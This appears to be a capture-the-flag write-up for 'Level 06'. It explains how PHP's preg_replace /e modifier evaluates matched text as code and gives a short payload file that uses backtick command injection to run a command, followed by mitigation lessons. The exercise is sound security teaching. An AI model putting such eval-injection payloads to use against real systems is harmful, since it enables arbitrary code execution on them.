# Level 06

## 💻 Source Code
```php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>
```

## 🔍 Security Vulnerability Analysis
- The `/e` modifier in the `preg_replace()` function in PHP 5.x versions causes a critical security vulnerability
- This modifier executes the regex-matched text as PHP code
- As a result, a Remote Code Execution (RCE) vulnerability emerges

## 🛠️ Solution Steps
1. First, create the payload file:
```bash
echo '[x ${`getflag`} ]' > /tmp/getflag06
```

2. Run the program:
```bash
./level06 /tmp/getflag06
```

## 📝 Lessons Learned
1. **Security Risk**: The `/e` modifier in PHP's `preg_replace()` function poses serious security risks
2. **Version Information**: The `/e` modifier was removed after PHP 5.5.0 for security reasons
3. **Best Practices**: 
   - Secure regex usage is essential when processing user input
   - When possible, prefer safer alternatives like `preg_replace_callback()`
   - It's important to use current PHP versions